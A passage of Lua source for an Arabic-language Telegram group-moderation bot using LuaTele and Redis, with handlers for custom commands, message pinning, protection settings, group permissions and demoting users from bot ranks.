return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."All:Command:List:Group")
Command = "٠ قائمه الاوامر المضافه العامه  \n– – – – – – – –\n"
for k,v in pairs(list) do
Commands = Redis:get(darket.."All:Get:Reides:Commands:Group"..v)
if Commands then 
Command = Command..""..k..": ("..v..") ٠ {"..Commands.."}\n"
else
Command = Command..""..k..": ("..v..") \n"
end
end
if #list == 0 then
Command = "٠ لا توجد اوامر اضافيه عامه"
end
return send(msg_chat_id,msg_id,Command,"md",true)
end


if text == "اضف امر" then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Command:Reids:Group"..msg_chat_id..":"..msg.sender.user_id,"true") 
return send(msg_chat_id,msg_id,"٠الان ارسل لي الامر القديم ...","md",true)
end
if text == "حذف امر" or text == "مسح امر" then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(darket.."Command:Reids:Group:Del"..msg_chat_id..":"..msg.sender.user_id,"true") 
return send(msg_chat_id,msg_id,"٠ ارسل الان الامر الذي قمت بوضعه مكان الامر القديم","md",true)
end
if text == "حذف الاوامر المضافه" or text == "مسح الاوامر المضافه" then 
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."Command:List:Group"..msg_chat_id)
for k,v in pairs(list) do
Redis:del(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..v)
Redis:del(darket.."Command:List:Group"..msg_chat_id)
end
return send(msg_chat_id,msg_id,"٠ تم مسح جميع الاوامر التي تم اضافتها","md",true)
end
if text == "الاوامر المضافه" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."Command:List:Group"..msg_chat_id.."")
Command = "٠ قائمه الاوامر المضافه  \n– – – – – – – –\n"
for k,v in pairs(list) do
Commands = Redis:get(darket.."Get:Reides:Commands:Group"..msg_chat_id..":"..v)
if Commands then 
Command = Command..""..k..": ("..v..") ٠ {"..Commands.."}\n"
else
Command = Command..""..k..": ("..v..") \n"
end
end
if #list == 0 then
Command = "٠ لا توجد اوامر اضافيه"
end
return send(msg_chat_id,msg_id,Command,"html",true)
end

if text == "تثبيت" and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).PinMsg == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه تثبيت الرسائل* ',"md",true)  
end
send(msg_chat_id,msg_id,"\n٠ تم تثبيت الرساله","md",true)
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local PinMsg = LuaTele.pinChatMessage(msg_chat_id,Message_Reply.id,true)
end
if text == 'الغاء التثبيت' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).PinMsg == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه تثبيت الرسائل* ',"md",true)  
end
send(msg_chat_id,msg_id,"\n٠ تم الغاء تثبيت الرساله","md",true)
LuaTele.unpinChatMessage(msg_chat_id) 
end
if text == 'الغاء تثبيت الكل' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
if GetInfoBot(msg).PinMsg == false then
return send(msg_chat_id,msg_id,'\n*٠ البوت ليس لديه صلاحيه تثبيت الرسائل* ',"md",true)  
end
send(msg_chat_id,msg_id,"\n٠ تم الغاء تثبيت كل الرسائل","md",true)
LuaTele.unpinAllChatMessages(msg_chat_id)
end
if text == "الحمايه" then    
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'تعطيل الرابط', data = msg.sender.user_id..'/'.. 'unmute_link'},{text = 'تفعيل الرابط', data = msg.sender.user_id..'/'.. 'mute_link'},
},
{
{text = 'تعطيل الترحيب', data = msg.sender.user_id..'/'.. 'unmute_welcome'},{text = 'تفعيل الترحيب', data = msg.sender.user_id..'/'.. 'mute_welcome'},
},
{
{text = 'اتعطيل الايدي', data = msg.sender.user_id..'/'.. 'unmute_Id'},{text = 'اتفعيل الايدي', data = msg.sender.user_id..'/'.. 'mute_Id'},
},
{
{text = 'تعطيل الايدي بالصوره', data = msg.sender.user_id..'/'.. 'unmute_IdPhoto'},{text = 'تفعيل الايدي بالصوره', data = msg.sender.user_id..'/'.. 'mute_IdPhoto'},
},
{
{text = 'تعطيل الردود', data = msg.sender.user_id..'/'.. 'unmute_ryple'},{text = 'تفعيل الردود', data = msg.sender.user_id..'/'.. 'mute_ryple'},
},
{
{text = 'تعطيل الردود العامه', data = msg.sender.user_id..'/'.. 'unmute_ryplesudo'},{text = 'تفعيل الردود العامه', data = msg.sender.user_id..'/'.. 'mute_ryplesudo'},
},
{
{text = 'تعطيل الرفع', data = msg.sender.user_id..'/'.. 'unmute_setadmib'},{text = 'تفعيل الرفع', data = msg.sender.user_id..'/'.. 'mute_setadmib'},
},
{
{text = 'تعطيل الطرد', data = msg.sender.user_id..'/'.. 'unmute_kickmembars'},{text = 'تفعيل الطرد', data = msg.sender.user_id..'/'.. 'mute_kickmembars'},
},
{
{text = 'تعطيل الالعاب', data = msg.sender.user_id..'/'.. 'unmute_games'},{text = 'تفعيل الالعاب', data = msg.sender.user_id..'/'.. 'mute_games'},
},
{
{text = 'تعطيل اطردني', data = msg.sender.user_id..'/'.. 'unmute_kickme'},{text = 'تفعيل اطردني', data = msg.sender.user_id..'/'.. 'mute_kickme'},
},
{
{text = '- اخفاء الامر ', data =msg.sender.user_id..'/'.. 'delAmr'}
},
}
}
return send(msg_chat_id, msg_id, '٠اوامر التفعيل والتعطيل ', 'md', false, false, false, false, reply_markup)
end  
if text == 'اعدادات الحمايه' then 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:get(darket.."Status:Link"..msg.chat_id) then
Statuslink = '❬ ✔️ ❭' else Statuslink = '❬ ❌ ❭'
end
if Redis:get(darket.."Status:Welcome"..msg.chat_id) then
StatusWelcome = '❬ ✔️ ❭' else StatusWelcome = '❬ ❌ ❭'
end
if Redis:get(darket.."Status:Id"..msg.chat_id) then
StatusId = '❬ ✔️ ❭' else StatusId = '❬ ❌ ❭'
end
if Redis:get(darket.."Status:IdPhoto"..msg.chat_id) then
StatusIdPhoto = '❬ ✔️ ❭' else StatusIdPhoto = '❬ ❌ ❭'
end
if not Redis:get(darket.."Status:Reply"..msg.chat_id) then
StatusReply = '❬ ✔️ ❭' else StatusReply = '❬ ❌ ❭'
end
if not Redis:get(darket.."Status:ReplySudo"..msg.chat_id) then
StatusReplySudo = '❬ ✔️ ❭' else StatusReplySudo = '❬ ❌ ❭'
end
if Redis:get(darket.."Status:BanId"..msg.chat_id)  then
StatusBanId = '❬ ✔️ ❭' else StatusBanId = '❬ ❌ ❭'
end
if Redis:get(darket.."Status:SetId"..msg.chat_id) then
StatusSetId = '❬ ✔️ ❭' else StatusSetId = '❬ ❌ ❭'
end
if Redis:get(darket.."Status:Games"..msg.chat_id) then
StatusGames = '❬ ✔️ ❭' else StatusGames = '❬ ❌ ❭'
end
if Redis:get(darket.."Status:KickMe"..msg.chat_id) then
Statuskickme = '❬ ✔️ ❭' else Statuskickme = '❬ ❌ ❭'
end
if Redis:get(darket.."Status:AddMe"..msg.chat_id) then
StatusAddme = '❬ ✔️ ❭' else StatusAddme = '❬ ❌ ❭'
end
local protectionGroup = '\n*٠اعدادات حمايه الكروب\n – – – – – – – –\n'
..'\n٠جلب الرابط ➤ '..Statuslink
..'\n٠جلب الترحيب ➤ '..StatusWelcome
..'\n٠الايدي ➤ '..StatusId
..'\n٠الايدي بالصوره ➤ '..StatusIdPhoto
..'\n٠الردود ➤ '..StatusReply
..'\n٠الردود العامه ➤ '..StatusReplySudo
..'\n٠الرفع ➤ '..StatusSetId
..'\n٠الحظر - الطرد ➤ '..StatusBanId
..'\n٠الالعاب ➤ '..StatusGames
..'\n٠ امر اطردني ➤ '..Statuskickme..'*\n\n.'
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
return send(msg_chat_id, msg_id,protectionGroup,'md', false, false, false, false, reply_markup)
end
if text == "الاعدادات" then    
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Text = "*\n٠اعدادات الكروب ".."\n🔏︙علامة ال (✔️) تعني مقفول".."\n🔓︙علامة ال (❌) تعني مفتوح*"
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = GetSetieng(msg_chat_id).lock_links, data = '&'},{text = 'الروابط : ', data =msg.sender.user_id..'/'.. 'Status_link'},
},
{
{text = GetSetieng(msg_chat_id).lock_spam, data = '&'},{text = 'الكلايش : ', data =msg.sender.user_id..'/'.. 'Status_spam'},
},
{
{text = GetSetieng(msg_chat_id).lock_inlin, data = '&'},{text = 'الكيبورد : ', data =msg.sender.user_id..'/'.. 'Status_keypord'},
},
{
{text = GetSetieng(msg_chat_id).lock_vico, data = '&'},{text = 'الاغاني : ', data =msg.sender.user_id..'/'.. 'Status_voice'},
},
{
{text = GetSetieng(msg_chat_id).lock_gif, data = '&'},{text = 'المتحركه : ', data =msg.sender.user_id..'/'.. 'Status_gif'},
},
{
{text = GetSetieng(msg_chat_id).lock_file, data = '&'},{text = 'الملفات : ', data =msg.sender.user_id..'/'.. 'Status_files'},
},
{
{text = GetSetieng(msg_chat_id).lock_text, data = '&'},{text = 'الدردشه : ', data =msg.sender.user_id..'/'.. 'Status_text'},
},
{
{text = GetSetieng(msg_chat_id).lock_ved, data = '&'},{text = 'الفيديو : ', data =msg.sender.user_id..'/'.. 'Status_video'},
},
{
{text = GetSetieng(msg_chat_id).lock_photo, data = '&'},{text = 'الصور : ', data =msg.sender.user_id..'/'.. 'Status_photo'},
},
{
{text = GetSetieng(msg_chat_id).lock_user, data = '&'},{text = 'المعرفات : ', data =msg.sender.user_id..'/'.. 'Status_username'},
},
{
{text = GetSetieng(msg_chat_id).lock_hash, data = '&'},{text = 'التاك : ', data =msg.sender.user_id..'/'.. 'Status_tags'},
},
{
{text = GetSetieng(msg_chat_id).lock_bots, data = '&'},{text = 'البوتات : ', data =msg.sender.user_id..'/'.. 'Status_bots'},
},
{
{text = '- التالي ... ', data =msg.sender.user_id..'/'.. 'NextSeting'}
},
{
{text = '- اخفاء الامر ', data =msg.sender.user_id..'/'.. 'delAmr'}
},
}
}
return send(msg_chat_id, msg_id, Text, 'md', false, false, false, false, reply_markup)
end  


if text == 'الكروب' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local Info_Chats = LuaTele.getSupergroupFullInfo(msg_chat_id)
local Get_Chat = LuaTele.getChat(msg_chat_id)
if Get_Chat.permissions.can_add_web_page_previews then
web = '❬ ✔️ ❭' else web = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_change_info then
info = '❬ ✔️ ❭' else info = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_invite_users then
invite = '❬ ✔️ ❭' else invite = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_pin_messages then
pin = '❬ ✔️ ❭' else pin = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_media_messages then
media = '❬ ✔️ ❭' else media = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_messages then
messges = '❬ ✔️ ❭' else messges = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_other_messages then
other = '❬ ✔️ ❭' else other = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_polls then
polls = '❬ ✔️ ❭' else polls = '❬ ❌ ❭'
end
local permissions = '*\n٠صلاحيات الكروب :\n– – – – – – – –'..'\n٠ارسال الويب : '..web..'\n٠تغيير معلومات الكروب : '..info..'\n٠اضافه مستخدمين : '..invite..'\n٠تثبيت الرسائل : '..pin..'\n٠ارسال الميديا : '..media..'\n٠ارسال الرسائل : '..messges..'\n٠اضافه البوتات : '..other..'\n٠ارسال استفتاء : '..polls..'*\n\n'
local TextChat = '*\n٠معلومات الكروب :\n– – – – – – – –'..' \n٠عدد الادمنيه : ❬ '..Info_Chats.administrator_count..' ❭\n٠عدد المحظورين : ❬ '..Info_Chats.banned_count..' ❭\n٠عدد الاعضاء : ❬ '..Info_Chats.member_count..' ❭\n٠عدد المقيديين : ❬ '..Info_Chats.restricted_count..' ❭\n٠اسم الكروب : ❬* ['..Get_Chat.title..']('..Info_Chats.invite_link.invite_link..')* ❭*'
return send(msg_chat_id,msg_id, TextChat..permissions,"md",true)
end
if text == 'صلاحيات الكروب' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return send(msg_chat_id,msg_id,"\n*٠ عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له *","md",true)  
end
local Get_Chat = LuaTele.getChat(msg_chat_id)
if Get_Chat.permissions.can_add_web_page_previews then
web = '❬ ✔️ ❭' else web = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_change_info then
info = '❬ ✔️ ❭' else info = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_invite_users then
invite = '❬ ✔️ ❭' else invite = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_pin_messages then
pin = '❬ ✔️ ❭' else pin = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_media_messages then
media = '❬ ✔️ ❭' else media = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_messages then
messges = '❬ ✔️ ❭' else messges = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_other_messages then
other = '❬ ✔️ ❭' else other = '❬ ❌ ❭'
end
if Get_Chat.permissions.can_send_polls then
polls = '❬ ✔️ ❭' else polls = '❬ ❌ ❭'
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- ارسال الويب : '..web, data = msg.sender.user_id..'/web'}, 
},
{
{text = '- تغيير معلومات الكروب : '..info, data =msg.sender.user_id..  '/info'}, 
},
{
{text = '- اضافه مستخدمين : '..invite, data =msg.sender.user_id..  '/invite'}, 
},
{
{text = '- تثبيت الرسائل : '..pin, data =msg.sender.user_id..  '/pin'}, 
},
{
{text = '- ارسال الميديا : '..media, data =msg.sender.user_id..  '/media'}, 
},
{
{text = '- ارسال الرسائل : .'..messges, data =msg.sender.user_id..  '/messges'}, 
},
{
{text = '- اضافه البوتات : '..other, data =msg.sender.user_id..  '/other'}, 
},
{
{text = '- ارسال استفتاء : '..polls, data =msg.sender.user_id.. '/polls'}, 
},
{
{text = '- اخفاء الامر ', data =msg.sender.user_id..'/'.. '/delAmr'}
},
}
}
return send(msg_chat_id, msg_id, "٠الصلاحيات - ", 'md', false, false, false, false, reply_markup)
end
if text == 'تنزيل الكل' and msg.reply_to_message_id ~= 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if Redis:sismember(darket.."Dev:Groups",Message_Reply.sender.user_id) then
dev = "المطور ،" else dev = "" end
if Redis:sismember(darket.."Supcreator:Group"..msg_chat_id, Message_Reply.sender.user_id) then
crr = "منشئ اساسي ،" else crr = "" end
if Redis:sismember(darket..'Creator:Group'..msg_chat_id, Message_Reply.sender.user_id) then
cr = "منشئ ،" else cr = "" end
if Redis:sismember(darket..'Manger:Group'..msg_chat_id, Message_Reply.sender.user_id) then
own = "مدير ،" else own = "" end
if Redis:sismember(darket..'Admin:Group'..msg_chat_id, Message_Reply.sender.user_id) then
mod = "ادمن ،" else mod = "" end
if Redis:sismember(darket..'Special:Group'..msg_chat_id, Message_Reply.sender.user_id) then
vip = "مميز ،" else vip = ""
end
if The_ControllerAll(Message_Reply.sender.user_id) == true then
Rink = 1
elseif Redis:sismember(darket.."Dev:Groups",Message_Reply.sender.user_id)  then
Rink = 2
elseif Redis:sismember(darket.."Supcreator:Group"..msg_chat_id, Message_Reply.sender.user_id) then
Rink = 3
elseif Redis:sismember(darket.."Creator:Group"..msg_chat_id, Message_Reply.sender.user_id) then
Rink = 4
elseif Redis:sismember(darket.."Manger:Group"..msg_chat_id, Message_Reply.sender.user_id) then
Rink = 5
elseif Redis:sismember(darket.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id) then
Rink = 6
elseif Redis:sismember(darket.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id) then
Rink = 7
else
Rink = 8
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) == false then
return send(msg_chat_id,msg_id,"\n*٠ليس لديه اي رتبه هنا *","md",true)  
end
if msg.ControllerBot then
if Rink == 1 or Rink < 1 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Dev:Groups",Message_Reply.sender.user_id)
Redis:srem(darket.."Supcreator:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Creator:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Manger:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
elseif msg.Dev then
if Rink == 2 or Rink < 2 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Supcreator:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Creator:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Manger:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
elseif msg.Supcreator then
if Rink == 3 or Rink < 3 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Creator:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Manger:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
elseif msg.Creator then
if Rink == 4 or Rink < 4 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Manger:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
elseif msg.Manger then
if Rink == 5 or Rink < 5 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(darket.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
elseif msg.Admin then
if Rink == 6 or Rink < 6 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
end
return send(msg_chat_id,msg_id,"\n*٠ تم تنزيل الشخص من الرتب التاليه { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." *}","md",true)  
end

if text and text:match('^تنزيل الكل @(%S+)$') then
local UserName = text:match('^تنزيل الكل @(%S+)$')
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n٠ عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if Redis:sismember(darket.."Dev:Groups",UserId_Info.id) then
dev = "المطور ،" else dev = "" end
if Redis:sismember(darket.."Supcreator:Group"..msg_chat_id, UserId_Info.id) then
crr = "منشئ اساسي ،" else crr = "" end
if Redis:sismember(darket..'Creator:Group'..msg_chat_id, UserId_Info.id) then
cr = "منشئ ،" else cr = "" end
if Redis:sismember(darket..'Manger:Group'..msg_chat_id, UserId_Info.id) then
own = "مدير ،" else own = "" end
if Redis:sismember(darket..'Admin:Group'..msg_chat_id, UserId_Info.id) then
mod = "ادمن ،" else mod = "" end
if Redis:sismember(darket..'Special:Group'..msg_chat_id, UserId_Info.id) then
vip = "مميز ،" else vip = ""
end
if The_ControllerAll(UserId_Info.id) == true then
Rink = 1
elseif Redis:sismember(darket.."Dev:Groups",UserId_Info.id)  then
Rink = 2
elseif Redis:sismember(darket.."Supcreator:Group"..msg_chat_id, UserId_Info.id) then
Rink = 3
elseif Redis:sismember(darket.."Creator:Group"..msg_chat_id, UserId_Info.id) then
Rink = 4
elseif Redis:sismember(darket.."Manger:Group"..msg_chat_id, UserId_Info.id) then
Rink = 5
elseif Redis:sismember(darket.."Admin:Group"..msg_chat_id, UserId_Info.id) then
Rink = 6
elseif Redis:sismember(darket.."Special:Group"..msg_chat_id, UserId_Info.id) then
Rink = 7
else
Rink = 8
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) == false then
return send(msg_chat_id,msg_id,"\n*٠ليس لديه اي رتبه هنا *","md",true)  
end
if msg.ControllerBot then
if Rink == 1 or Rink < 1 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Dev:Groups",UserId_Info.id)
Redis:srem(darket.."Supcreator:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Creator:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Manger:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Admin:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(darket.."Special:Group"..msg_chat_id, UserId_Info.id)
elseif msg.Dev then
if Rink == 2 or Rink < 2 then
return send(msg_chat_id,msg_id,"\n*٠ لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك *","md",true)  
end
Redis:srem(darket.."Supcreator:Group"..msg_chat_id, UserId_Info.id)
